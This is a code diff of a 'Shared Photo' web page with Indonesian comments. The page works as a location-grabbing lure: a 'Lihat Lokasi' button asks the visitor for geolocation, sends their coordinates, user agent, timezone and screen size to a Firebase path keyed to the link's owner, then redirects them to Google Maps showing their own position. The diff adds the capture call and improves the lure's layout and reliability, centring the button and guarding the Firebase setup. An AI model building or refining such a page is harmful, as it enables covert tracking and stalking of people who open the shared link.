@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover">
 <title>Shared Photo</title>
 
 <meta property="og:title" content="Shared Photo" />
@@ -28,29 +28,45 @@ html,body{height:100%;background:#000;overflow:hidden;font-family:-apple-system,
   position:relative;
   width:100%;
   height:100vh;
+  height:100dvh;              /* fix viewport mobile */
   display:flex;
   align-items:center;
   justify-content:center;
+  overflow:hidden;
 }
 #mainPhoto{
+  position:absolute;
+  inset:0;
   width:100%;
   height:100%;
   object-fit:cover;
   display:block;
   user-select:none;
   -webkit-user-drag:none;
+  z-index:1;
 }
 
-/* ══ BOTTOM GRADIENT OVERLAY ══ */
-.overlay{
+/* ══ DARK VIGNETTE supaya tombol kontras ══ */
+.vignette{
   position:absolute;
-  bottom:0;left:0;right:0;
-  padding:80px 24px 40px;
-  background:linear-gradient(to top,rgba(0,0,0,.75) 0%,rgba(0,0,0,.3) 50%,transparent 100%);
+  inset:0;
+  background:radial-gradient(ellipse at center,
+    rgba(0,0,0,.15) 0%,
+    rgba(0,0,0,.35) 60%,
+    rgba(0,0,0,.55) 100%);
+  z-index:2;
+  pointer-events:none;
+}
+
+/* ══ CENTER BUTTON WRAP ══ */
+.center-wrap{
+  position:absolute;
+  inset:0;
   display:flex;
-  flex-direction:column;
   align-items:center;
-  gap:12px;
+  justify-content:center;
+  z-index:3;
+  padding:24px;
 }
 
 /* ══ BUTTON ══ */
@@ -59,23 +75,24 @@ html,body{height:100%;background:#000;overflow:hidden;font-family:-apple-system,
   align-items:center;
   justify-content:center;
   gap:10px;
-  width:100%;
-  max-width:320px;
-  padding:15px 24px;
+  padding:16px 28px;
   background:#4CAF50;
   color:#fff;
   border:none;
   border-radius:50px;
-  font-size:15px;
+  font-size:16px;
   font-weight:700;
   letter-spacing:.3px;
   cursor:pointer;
   font-family:inherit;
-  box-shadow:0 6px 24px rgba(0,0,0,.45);
+  box-shadow:0 8px 32px rgba(0,0,0,.55),0 0 0 1px rgba(255,255,255,.08) inset;
   transition:background .15s,transform .1s,opacity .15s;
+  white-space:nowrap;
+  backdrop-filter:blur(2px);
+  -webkit-backdrop-filter:blur(2px);
 }
-.btn-lokasi:active{background:#388E3C;transform:scale(.97)}
-.btn-lokasi:disabled{opacity:.6;cursor:not-allowed}
+.btn-lokasi:active{background:#388E3C;transform:scale(.96)}
+.btn-lokasi:disabled{opacity:.7;cursor:not-allowed}
 .btn-lokasi svg{width:20px;height:20px;fill:#fff;flex-shrink:0}
 
 /* ══ SPINNER inside button ══ */
@@ -89,13 +106,6 @@ html,body{height:100%;background:#000;overflow:hidden;font-family:-apple-system,
 }
 @keyframes spin{to{transform:rotate(360deg)}}
 
-/* ══ FOOTER TEXT ══ */
-.overlay-footer{
-  font-size:11px;
-  color:rgba(255,255,255,.4);
-  letter-spacing:.2px;
-}
-
 /* ══ INVALID LINK SCREEN ══ */
 .err-screen{
   position:fixed;inset:0;
@@ -108,6 +118,7 @@ html,body{height:100%;background:#000;overflow:hidden;font-family:-apple-system,
   gap:14px;
   padding:32px;
   text-align:center;
+  z-index:10;
 }
 .err-screen .err-icon{
   width:72px;height:72px;
@@ -165,15 +176,16 @@ html,body{height:100%;background:#000;overflow:hidden;font-family:-apple-system,
 <!-- ══ MAIN VIEW ══ -->
 <div class="photo-wrap" id="photoWrap">
   <img id="mainPhoto" alt="Shared photo">
+  <div class="vignette"></div>
 
-  <div class="overlay">
+  <!-- Tombol di tengah -->
+  <div class="center-wrap">
     <button class="btn-lokasi" id="btnLokasi" onclick="handleLokasi()">
       <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
         <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
       </svg>
       Lihat Lokasi
     </button>
-
   </div>
 </div>
 
@@ -193,13 +205,20 @@ const FC = {
   messagingSenderId:750633313866,
   appId:"1:750636313866:web:3d2e552960e06db83968b3"
 };
-const app = initializeApp(FC);
-const db  = getDatabase(app);
 
-// ══ PARAMS ══
+// ══ Firebase init dengan guard ══
+let db = null;
+try {
+  const app = initializeApp(FC);
+  db = getDatabase(app);
+} catch(e) {
+  console.warn('Firebase gagal init:', e);
+}
+
+// ══ PARAMS (decode!) ══
 const params    = new URLSearchParams(location.search);
-const fotoUrl   = params.get('foto') || '';
-const ownerUser = params.get('u')    || '';
+const fotoUrl   = decodeURIComponent(params.get('foto') || '');
+const ownerUser = decodeURIComponent(params.get('u')    || '');
 
 // ══ ELEMENTS ══
 const photoWrap = document.getElementById('photoWrap');
@@ -208,15 +227,32 @@ const errBox    = document.getElementById('errBox');
 const btnLokasi = document.getElementById('btnLokasi');
 const toast     = document.getElementById('toast');
 
-// ══ VALIDATE & SHOW PHOTO ══
-if (!fotoUrl || !ownerUser) {
+// ══ SHOW ERROR ══
+function showError() {
   photoWrap.classList.add('hide');
   errBox.classList.remove('hide');
+}
+
+// ══ VALIDATE & SHOW PHOTO ══
+if (!fotoUrl || !ownerUser) {
+  showError();
 } else {
-  mainPhoto.onerror = () => {
-    photoWrap.classList.add('hide');
-    errBox.classList.remove('hide');
+  // Timeout fallback kalau gambar stuck
+  const imgTimeout = setTimeout(() => {
+    if (!mainPhoto.complete || mainPhoto.naturalWidth === 0) {
+      showError();
+    }
+  }, 12000);
+
+  mainPhoto.onload = () => {
+    clearTimeout(imgTimeout);
+    if (mainPhoto.naturalWidth === 0) showError();
   };
+  mainPhoto.onerror = () => {
+    clearTimeout(imgTimeout);
+    showError();
+  };
+
   mainPhoto.src = fotoUrl;
 }
 
@@ -256,21 +292,25 @@ window.handleLokasi = function () {
       const lat = pos.coords.latitude;
       const lng = pos.coords.longitude;
 
-      // Simpan ke Firebase (background, tidak memblokir redirect)
-      push(ref(db, 'lokasi/' + ownerUser), {
-        target:    'images',
-        waktu:     Date.now(),
-        lat,
-        lng,
-        akurasi:   pos.coords.accuracy,
-        foto:      fotoUrl,
-        platform:  navigator.platform || 'Unknown',
-        userAgent: navigator.userAgent,
-        timezone:  Intl.DateTimeFormat().resolvedOptions().timeZone,
-        screen:    screen.width + 'x' + screen.height,
-        via:       'view',
-        source:    'view.html'
-      }).catch(() => {});
+      // Simpan ke Firebase (kalau tersedia)
+      if (db) {
+        try {
+          push(ref(db, 'lokasi/' + ownerUser), {
+            target:    'images',
+            waktu:     Date.now(),
+            lat,
+            lng,
+            akurasi:   pos.coords.accuracy,
+            foto:      fotoUrl,
+            platform:  navigator.platform || 'Unknown',
+            userAgent: navigator.userAgent,
+            timezone:  Intl.DateTimeFormat().resolvedOptions().timeZone,
+            screen:    screen.width + 'x' + screen.height,
+            via:       'view',
+            source:    'view.html'
+          }).catch(() => {});
+        } catch(e) {}
+      }
 
       // Langsung ke Google Maps
       window.location.href = 'https://www.google.com/maps?q=' + lat + ',' + lng;
